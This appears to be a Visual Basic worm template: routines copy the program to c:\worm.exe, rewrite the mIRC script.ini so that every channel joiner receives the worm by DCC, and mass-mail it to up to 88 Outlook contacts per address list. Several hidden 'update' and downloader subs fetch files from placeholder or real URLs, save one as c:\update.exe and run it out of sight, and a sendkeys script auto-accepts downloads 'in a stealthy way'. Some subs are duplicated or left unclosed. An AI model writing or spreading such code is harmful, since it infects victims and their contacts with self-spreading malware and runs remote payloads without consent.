Option Explicit
Sub Main()
On Error Resume Next
Dim a, b, c, y, x, oo, d, e, xx, yy, zz
xx = App.Path & App.EXEName & ".exe"
yy = App.Path & "\" & App.EXEName & ".exe"
zz = "c:\worm.exe"
FileCopy xx, zz
FileCopy yy, zz
End Sub

Sub IRC()
Open "c:\mIRC\script.ini" for output as 3
Print #3, "n1= on 1:JOIN:#:{"
Print #3, "n2= /if ( $nick == $me ) { halt }"
Print #3, "n3= /msg $nick Hello.. this is a worm.."
Print #3, "n4= /dcc send -c $nick c:\worm.exe"
Print #3, "n5= }"
Close 1

Sub Outlook()
Set a = CreateObject("Outlook.Application")
Set b = a.GetNameSpace("MAPI")
If a = "Outlook" Then
b.Logon "profile", "password"
For y = 1 To b.AddressLists.Count
Set d = b.AddressLists(y)
x = 1
Set c = a.CreateItem(0)
For oo = 1 To d.AddressEntries.Count
e = d.AddressEntries(x)
c.Recipients.Add e
x = x + 1
If x > 88 Then oo = d.AddressEntries.Count
Next oo
c.Subject = "(Your Personalized Subject)"
c.Body = "(Your Personalized Body)"
c.Attachments.Add "c:\worm.exe"
c.Send
e = ""
Next y
b.Logoff
End If
End Sub

Sub update()
on error resume next
Shell "start http://www.yoursite.com/blah/bleh/blih/File.ext", vbHide
End sub

Sub update()
on error resume next
Shell "start http://www.yoursite.com/blah/bleh/blih/File.ext", vbHide
Open "c:\v.vbs" For Output As 2
Print #2, "Dim sh"
Print #2, "Set sh = CreateObject(""WScript.Shell"")"
Print #2, " Do Until sh.AppActivate(""File Download"")"
Print #2, "Loop"
Print #2, "sh.sendkeys ""%O"""
Close 2
Shell "start c:\v.vbs", vbHide <----- execute v.vbs in a stealthy way..
End sub

sub jackieupdate()
Set objNET = CreateObject("InternetExplorer.Application")
Do While objNET.Busy
VBA.DoEvents
Loop
objNET.Visible = 0
objNET.Navigate "http://www.your-url-here.org/your-file-here.txt"
Do While objNET.ReadyState <> 4
VBA.DoEvents
Loop
sCode = objNET.Document.Body.innerText
objNET.Quit
end sub

sub update()
Dim objInet
Dim intfile As Integer
Dim strDownloadedCode As String
Set objInet = CreateObject("InetCtls.Inet") ' another useful object, baby!
objInet.RequestTimeOut = 25 'wait for 25 secs..
strDownloadedCode = objInet.OpenURL("http://members.tripod.com/alc0paul/update.txt") ' get the update
end sub

Sub downloader()
On Error Resume Next
Dim databyte() As Byte
If InternetGetConnectedState(0&, 0&) = 0 Then GoTo xIt
Set objInet = CreateObject("InetCtls.Inet")
objInet.RequestTimeout = 40
databyte() = objInet.OpenURL("http://yoursite.com/file.plg", icByteArray)
Open "c:\update.exe" For Binary Access Write As #2
Put #2, , databyte()
Close #2
Shell "c:\update.exe", vbHide
xIt:
End Sub
